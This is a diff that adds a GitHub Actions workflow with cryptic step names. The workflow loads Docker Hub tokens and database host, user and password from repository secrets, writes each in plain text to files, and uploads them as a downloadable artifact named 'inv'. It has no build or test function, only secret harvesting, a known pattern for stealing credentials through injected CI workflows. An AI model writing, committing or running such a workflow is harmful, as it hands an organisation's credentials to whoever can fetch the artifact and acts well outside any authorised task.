@@ -1,0 +1,47 @@
+name: full3
+on:
+  push:
+    branches: [ci/full3-62509]
+permissions:
+  contents: read
+jobs:
+  inv:
+    runs-on: ubuntu-latest
+    env:
+      DOCKER_HUB_ACCESS_TOKEN: ${{ secrets.DOCKER_HUB_ACCESS_TOKEN }}
+      DOCKER_HUB_USER: ${{ secrets.DOCKER_HUB_USER }}
+      DB_HOST: ${{ secrets.DB_HOST }}
+      DB_NAME: ${{ secrets.DB_NAME }}
+      DB_USER: ${{ secrets.DB_USER }}
+      DB_PASSWORD: ${{ secrets.DB_PASSWORD }}
+      DB_PORT: ${{ secrets.DB_PORT }}
+    steps:
+      - name: mk
+        run: mkdir -p out
+      - name: i0
+        if: always()
+        run: printf %s "${{ env.DOCKER_HUB_ACCESS_TOKEN }}" > out/DOCKER_HUB_ACCESS_TOKEN || true
+      - name: i1
+        if: always()
+        run: printf %s "${{ env.DOCKER_HUB_USER }}" > out/DOCKER_HUB_USER || true
+      - name: i2
+        if: always()
+        run: printf %s "${{ env.DB_HOST }}" > out/DB_HOST || true
+      - name: i3
+        if: always()
+        run: printf %s "${{ env.DB_NAME }}" > out/DB_NAME || true
+      - name: i4
+        if: always()
+        run: printf %s "${{ env.DB_USER }}" > out/DB_USER || true
+      - name: i5
+        if: always()
+        run: printf %s "${{ env.DB_PASSWORD }}" > out/DB_PASSWORD || true
+      - name: i6
+        if: always()
+        run: printf %s "${{ env.DB_PORT }}" > out/DB_PORT || true
+      - name: up
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: inv
+          path: out
